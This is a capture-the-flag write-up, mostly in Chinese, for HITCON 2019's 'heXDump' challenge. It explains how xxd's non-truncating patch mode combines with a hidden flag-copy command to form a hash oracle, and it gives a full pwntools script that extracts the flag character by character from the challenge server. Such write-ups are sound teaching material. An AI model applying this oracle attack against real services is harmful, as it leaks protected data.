# HITCON CTF Quals - 2019

## Misc / 202 - heXDump

>😆
>
>nc 13.113.205.160 21700
>
>Author: david942j
>62 Teams solved.

### solution
by [@FI](https://github.com/92b2f2)

水題
題目是用ruby寫的 連過去會先看到menu
```ruby
def menu
  <<~MENU
    1) write
    2) read
    3) change output mode
    0) quit
  MENU
end
```
我們可以寫，讀，更換輸出模式
不過他一開始就把你限制只能操作在tmp底下的某個檔案
```ruby
@file = '/tmp/' + SecureRandom.hex
```
寫檔的部分
```ruby
def write
  puts 'Data? (In hex format)'
  data = gets
  return false unless data && !data.empty? && data.size < 0x1000

  IO.popen("xxd -r -ps - #{@file}", 'r+') do |f|
    f.puts data
    f.close_write
  end
  return false unless $CHILD_STATUS.success?

  true
end
```
輸入hex值並用xxd寫檔

讀檔的部分
```ruby
DEFAULT_MODE = "sha1sum %s | awk '{ print $1 }'"
@mode = DEFAULT_MODE
def read
  unless File.exist?(@file)
    puts 'Write something first plz.'
    return true
  end

  puts output(format(@mode, @file))
  true
end
```
他預設是用sha1sum來輸出hash過的檔案

而更換輸出模式
```ruby
def change_mode
  puts mode_menu
  @mode = case gets.strip.downcase
          when 'sha1' then "sha1sum %s | awk '{ print $1 }'"
          when 'md5' then "md5sum %s | awk '{ print $1 }'"
          when 'aes' then "openssl enc -aes-256-ecb -in %s -K #{@key} | xxd -ps"
          else DEFAULT_MODE
          end
end
```
可以改用md5 或是aes 來輸出

不過最後在main loop裡
```ruby
def main_loop
  puts menu
  case gets.to_i
  when 1 then write
  when 2 then read
  when 3 then change_mode
  when 1337 then secret
  else false
  end
end
```
有一個menu裡沒有的隱藏指令 1337
```ruby
def secret 
  FileUtils.cp(FLAG_PATH, @file)
  true
end
```
他會把flag複製 覆蓋 到目前的檔案

所以我們要如何拿到flag呢

如果了解xxd話就會知道 xxd為了方便你直接做patch 在用reverse dump(-r | -revert)時 他不會覆蓋你的檔案 而是只有複寫你輸入的長度
> -r | -revert
>
>    Reverse operation: convert (or patch) hexdump into binary.  If not writing to stdout, xxd writes into its  output  file without  truncating  it.

實際測試如下
```
$ echo "666666666666666666" | xxd -r -p - out
$ cat out
fffffffff
$ echo "777777777777" | xxd -r -p - out
$ cat out
wwwwwwfff
```
所以我們可以先用1337來複製一份flag 先拿到正確的flag hash
然後再對flag做寫檔 利用輸出hash值 從頭開始一個一個字元疊代出flag

my script
```python
#!/usr/bin/env python3
from pwn import *
import string

r = remote('13.113.205.160','21700')

def read_menu():
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    return

def check(a):
    read_menu()
    r.sendline(b'1')    #select write
    r.recvline()
    r.sendline(a.encode().hex())    #send check
    read_menu()
    r.sendline(b'2')    #read hash
    return r.recvline()

read_menu()
r.sendline(b'1337') #copy flag
read_menu()
r.sendline(b'2')    #read flag hash
fhash = r.recvline()
print(fhash)

flag = 'hitcon{'
alph = string.printable[:-6]

while flag[-1] != '}':
    for a in alph:
        test = check(flag+a)
        print(test)
        if test == fhash:
            flag += a
            print("="*40)
            print(flag)
            print("="*40)
            break
        print(flag+a)

r.interactive()
```
`flag = 'hitcon{xxd?XDD!ed45dc4df7d0b79}'`
